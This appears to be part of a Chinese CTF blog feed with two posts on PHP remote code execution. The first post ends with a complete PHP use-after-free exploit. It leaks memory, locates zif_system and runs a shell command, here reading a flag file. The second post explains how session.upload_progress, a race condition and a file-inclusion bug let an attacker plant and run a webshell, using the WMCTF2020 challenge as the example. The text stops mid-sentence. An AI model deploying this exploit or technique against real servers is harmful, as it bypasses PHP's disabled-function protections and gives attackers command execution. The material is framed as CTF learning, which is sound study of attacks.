class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-comment">#需要通过url编码哦</span><br></code></pre></td></tr></table></figure><h3 id="17、反弹shell"><a href="#17、反弹shell" class="headerlink" title="17、反弹shell"></a>17、反弹shell</h3><p>…</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_44657899/article/details/107676580">rce总结</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE(命令执行)总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>session.upload_progress文件包含漏洞</title>
    <link href="/2023/08/24/session.upload_progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/session.upload_progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="session-upload-progress文件包含漏洞"><a href="#session-upload-progress文件包含漏洞" class="headerlink" title="session.upload_progress文件包含漏洞"></a>session.upload_progress文件包含漏洞</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前学习了该漏洞，但是没有做笔记，导致容易遗忘。在此用一个题目来理解<code>session.upload_progress</code>漏洞</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="session存储"><a href="#session存储" class="headerlink" title="session存储"></a>session存储</h4><p>我们在phpinfo可以看到session的存储路径：</p><p><img src="https://s2.loli.net/2023/06/01/WlKLS3Egwzxurjs.png" alt="image-20230601203121482"></p><p>以下是一些session在linux的默认存储路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/lib/php/sess_PHPSESSID<br>/<span class="hljs-keyword">var</span>/lib/php/sessions/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure><p>session文件的文件名一般是通过：<code>sess_</code> 加上<code>PHPSESSID</code>字段  </p><h4 id="什么是session-upload-progress"><a href="#什么是session-upload-progress" class="headerlink" title="什么是session.upload_progress"></a>什么是session.upload_progress</h4><p>以下是<code>session.upload_progress</code>比较重要的几个选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">session.upload_progress.enabled = on<br>session.upload_progress.cleanup = on<br>session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></code></pre></td></tr></table></figure><ul><li>session.upload_progress.enabled可以控制是否开启session.upload_progress功能</li><li>session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</li><li>session.upload_progress.prefix可以设置上传文件内容中的前缀</li><li>session.upload_progress.name的值即为session中的键值</li></ul><p><code>session.auto_start</code>：如果开启这个选项，则PHP在接收请求的时候会<strong>自动初始化Session</strong>，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是<strong>默认关闭</strong>的。</p><p><code>session.upload_progress.cleanup = on</code>：表示当文件上传结束后，php将会立即清空对应session文件中的内容。该选项<strong>默认开启</strong></p><p><code>session.use_strict_mode</code>：默认情况下，该选项的值是0，此时用户可以自己定义Session ID</p><h3 id="session-upload-progress开启后有什么效果"><a href="#session-upload-progress开启后有什么效果" class="headerlink" title="session.upload_progress开启后有什么效果"></a>session.upload_progress开启后有什么效果</h3><blockquote><p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p></blockquote><p><strong>问题1：</strong></p><p>那么这个时候就会有一个前提条件，就是如何初始化session并且把session中的内容写到文件中去呢？</p><p><strong>分析1：</strong></p><p>我们可以注意到，php.ini中<code>session.use_strict_mode</code>选项默认是0，在这个情况下，用户可以自己定义自己的sessionid，例如当用户在cookie中设置<code>PHPSESSID=leekos</code>时，PHP就会生成一个文件<code>/tmp/sess_leekos</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_leekos</code>中去，具体文件的内容是什么，后面会写到。</p><p><strong>问题2：</strong></p><p>当session.upload_progress.cleanup的值为on时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？</p><p><strong>分析2：</strong></p><p>利用Python的多线程，进行<strong>条件竞争</strong>。</p><blockquote><p>当一个网站存在文件包含漏洞，但是并没有用户会话。即代码层未输入<code>session_start()</code>。<br>可借助Session Upload Progress，因为session.upload_progress.name 是用户自定义的，POST提交PHP_SESSION_UPLOAD_PROGRESS字段，只要上传包里带上这个键，PHP就会自动启用Session。同时在Cookie中设置PHPSESSID的值。这样，请求的文件内容和命名都可控。</p><p>当文件上传结束后，php会立即清空对应session文件中的内容，这会导致我们包含的很可能只是一个空文件，所以我们要利用条件竞争，在session文件被清除之前利用。</p></blockquote><h3 id="如何使用session-upload-progress进行RCE？"><a href="#如何使用session-upload-progress进行RCE？" class="headerlink" title="如何使用session.upload_progress进行RCE？"></a>如何使用session.upload_progress进行RCE？</h3><p>当一个网站存在文件包含漏洞时，我们可以尝试通过<code>session.upload_progress</code> 向服务器写入session文件，文件内容为一句话木马，然后配合文件包含漏洞包含进来，然后getshell</p><p>但是如果选项：<code>session.upload_progress.cleanup=on</code>那么文件一上传上去就会被删除，所以我们需要利用条件竞争</p><p>有两种方式：</p><ul><li>1、使用python脚本</li><li>2、使用burpsuite</li></ul><p>首先我们结合一道例题来讲解：</p><h4 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>此处存在文件包含漏洞，由于使用了 <code>require_once()</code>所以我们不能再次包含flag.php</p><p>这里可以使用 